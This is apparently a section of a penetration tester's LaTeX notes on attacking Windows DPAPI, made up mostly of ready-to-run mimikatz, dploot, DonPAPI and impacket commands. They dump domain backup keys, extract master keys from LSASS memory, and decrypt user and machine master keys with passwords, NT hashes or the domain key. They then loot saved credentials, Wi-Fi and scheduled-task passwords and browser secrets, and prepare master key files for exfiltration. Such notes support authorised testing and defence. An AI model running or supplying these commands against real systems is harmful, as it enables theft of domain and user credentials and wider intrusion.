\section{DPAPI}

\href{https://www.coresecurity.com/core-labs/articles/reading-dpapi-encrypted-keys-mimikatz}{Reading DPAPI Encrypted Keys with MimiKatz}

\subsection{dpapilab-ng}

\subsection{Enumeration}



\subsubsection{Seatbelt}

\subsection{Dump domain backup keys}
\begin{verbatim}
.\mimikatz.exe "lsadump::backupkeys /export /system:dc01.corp.local" exit

dpapi.py backupkeys --export -t corp.local/administrator:'passw0rd'@dc01.corp.local

dploot backupkey -outputfile ./corp.pvk -d corp.local -u administrator -p 'passw0rd' dc01.corp.local
\end{verbatim}


\subsection{Decrypt master key files}

\subsubsection{As local admin dump cached plain master keys from LSASS}

\begin{verbatim}
.\mimikatz.exe sekurlsa::dpapi exit
\end{verbatim}

\subsubsection{As domain admin decrypt the master key file of every user with the domain backup key}

\begin{verbatim}
dploot masterkeys -export-mk ./ws01/masterkeys -outputfile ./ws01 -pvk ./corp.pvk -u administrator -p 'passw0rd' ws01.corp.local
impacket-dpapi masterkey -pvk ./corp.pvk -file ./ws01/dpapi/masterkeys/$SID/$GUID
.\mimikatz.exe "dpapi::masterkey /pvk:.\corp.pvk /in:%USERPROFILE%\AppData\Roaming\Microsoft\Protect\%SID%\%GUID%" exit
\end{verbatim}

\subsubsection{As local admin decrypt the master key file of every user you know the password or NT hash of}
\begin{verbatim}
dploot masterkeys -export-mk ./ws01/masterkeys -outputfile ./ws01 -passwords ./credentials.txt -u administrator -p 'passw0rd' ws01.corp.local
dploot masterkeys -export-mk ./ws01/masterkeys -outputfile ./ws01 -nthashes ./nthashes.txt -u administrator -p 'passw0rd' ws01.corp.local

impacket-dpapi masterkey -file ./ws01/dpapi/masterkeys/$SID/$GUID -sid $SID -password 'passw0rd'

.\mimikatz.exe "dpapi::masterkey /protected /in:%USERPROFILE%\AppData\Roaming\Microsoft\Protect\%SID%\%GUID% /sid:%SID% /password:passw0rd" exit
\end{verbatim}

\subsubsection{Decrypt a domain users master key file when you have the users password, NT hash or code execution in the users context by retrieving the users backup key from a DC over MSRPC}

\begin{verbatim}
impacket-dpapi masterkey -f ./ws01/dpapi/masterkeys/$SID/$GUID -t administrator:'passw0rd'@ws01.corp.local
.\mimikatz.exe "dpapi::masterkey /rpc /in:%USERPROFILE%\AppData\Roaming\Microsoft\Protect\%SID%\%GUID%" exit
\end{verbatim}

\subsubsection{As local admin download all machine master key files}

\begin{verbatim}
dploot machinemasterkeys -export-mk ./ws01/masterkeys -outputfile ./ws01 -u administrator -p 'passw0rd' ws01.corp.local
\end{verbatim}



\subsection{Decrypt protected secrets}

\href{https://pentest.party/notes/windows/dpapi-dump}{dpapi-dump}


\subsection{Remotly}


\subsubsection{dploot / nxc}

{\bf Not as a domain administrator}:

If domain admin privileges have not been obtained, using Mimikatz' \verb+sekurlsa::dpapi+ command will retrieve DPAPI masterkey {GUID}:SHA1 mappings of any loaded master keys (user and SYSTEM) on a given system (tip: running dpapi::cache after key extraction will give you a nice table). 

If you change these keys to a {GUID1}:SHA1 {GUID2}:SHA1... type format, they can be supplied to dploot to triage the box. Use can also use lsassy to harvest decrypted masterkeys:

Then you can use this masterkey file to loot the targeted computer, for example with browser command (or any other User Triage commands):

\subsubsection{DonPAPI}
\href{https://github.com/login-securite/DonPAPI}{DonPAPI} 

With local admin account on a host, we can :
\begin{itemize}
    \item 
        Gather machine protected DPAPI secrets
        \begin{itemize}
            \item 
                ScheduledTask that will contain cleartext login/password of the account configured to run the task
            \item 
                Wi-Fi passwords
        \end{itemize}
    \item 
        Extract Masterkey's hash value for every user profiles (masterkeys beeing protected by the user's password, let's try to crack them with Hashcat)
    \item 
        Identify who is connected from where, in order to identify admin's personal computers.
    \item 
        Extract other non-dpapi protected secrets (VNC/Firefox/mRemoteNG)
    \item 
        Gather protected secrets from IE, Chrome, Firefox and start reaching the Azure tenant.
\end{itemize}

With a user password, or the domain PVK we can unprotect the user's DPAPI secrets.


\begin{verbatim}
# Dump all secrets of the target machine with an admin account 
$ DonPAPI.py domain/user:passw0rd@target

#Using user's hash
$ DonPAPI.py --hashes <LM>:<NT> domain/user@target

# Using kerberos (-k) and local auth (-local_auth)
$ DonPAPI.py -k domain/user@target
$ DonPAPI.py -local_auth user@target

# Using a user with LAPS password reading rights
$ DonPAPI.py -laps domain/user:passw0rd@target

# with a file containing a list of {user1:pass1]
$ DonPAPI.py -credz credz_file.txt domain/user:passw0rd@target

# When a domain admin user is available, it is possible to dump the domain
backup key using impacket dpapi
$ dpapi.py backupkeys --export -t domain/user:passw0rd@target_dc_ip
$ DonPAPI.py -pvk domain_backupkey.pvk domain/user:passw0rd@domain_network_list
\end{verbatim}

\subsection{Online / offline}
\href{https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials}{howto
credential manager saved credentials}

\subsubsection{exfiltrate the files to a windows attacker}

the files must be converted to base64.

cmd:
\begin{verbatim}
cd %appdata%\Microsoft\Protect\<SID>
certutil -encode <masterkey> C:\temp\mkey
\end{verbatim}

with powershell:
\begin{verbatim}
cd %appdata%\Microsoft\Protect\<SID>
[Convert]::ToBase64String([IO.File]::ReadAllBytes(".\<masterkey>"))
\end{verbatim}

do the same thing for content file
(\verb+%localappdata\Microsoft\Credentials\XXX+)


\subsubsection{Impacket's dpapi}
\begin{verbatim}
# identify the GUID of the master key
dpapi.py unprotect -file blob


# (not tested) Decrypt a master key (work also with Hash NTLM)
dpapi.py masterkey -file "/path/to/masterkey_file" -sid $USER_SID -password $MASTERKEY_PASSWORD

# Decrypt using the masterkey
dpapi.py unprotect -file blob -key $key


# (not tested) Obtain the backup keys & use it to decrypt a master key
dpapi.py backupkeys -t $DOMAIN/$USER:$PASSWORD@$TARGET
dpapi.py masterkey -file "/path/to/masterkey_file" -pvk "/path/to/backup_key.pvk"

# (not tested) Decrypt DPAPI-protected data using a master key
dpapi.py credential -file "/path/to/protected_file" -key $MASTERKEY
\end{verbatim}

\subsubsection{Impacket secretsdump}

\subsection{Mimikatz}

files must be decoded. Next, using mimikatz we're going to decrypt the
masterkey indicating the user's SID and password. mimikatz~\ref{tools:mimikatz}
module \verb+dpapi::masterkey+ with the appropriate arguments (\verb+/pvk+ or
\verb+/rpc+) to decrypt it.

\begin{verbatim}
mimikatz # dpapi::masterkey /in:<masterkey_path>
    /sid:S-1-5-21-953262931-566350628-63446256-1001 
    /password:<user_password>
\end{verbatim}

If everything works as expected, mimikatz should place the decrypted masterkey
in cache.

\begin{verbatim}
mimikatz # dpapi::cache
\end{verbatim}


Now we can read the credentials file using mimikatz module \verb+dpapi::cred+
with the appropiate \verb+/masterkey+ to decrypt.

\begin{verbatim}
mimikatz # dpapi::cred /in:<cred_path>
\end{verbatim}

You can extract many DPAPI masterkeys from memory with the
\verb+sekurlsa::dpapi+ module (if you are root).


\subsection{Links}
\begin{itemize}
    \item 
        \href{https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords}{HackTricks
        DPAPI - Extracting Passwords}
    \item 
        \href{https://docs.google.com/viewerng/viewer?url=https://www.synacktiv.com/ressources/univershell_2017_dpapi.pdf}{DPAPI
        exploitation during pentest and password cracking}
    \item
        \href{https://www.coresecurity.com/core-labs/articles/reading-dpapi-encrypted-keys-mimikatz}{https://www.coresecurity.com/core-labs/articles/reading-dpapi-encrypted-keys-mimikatz}
\end{itemize}


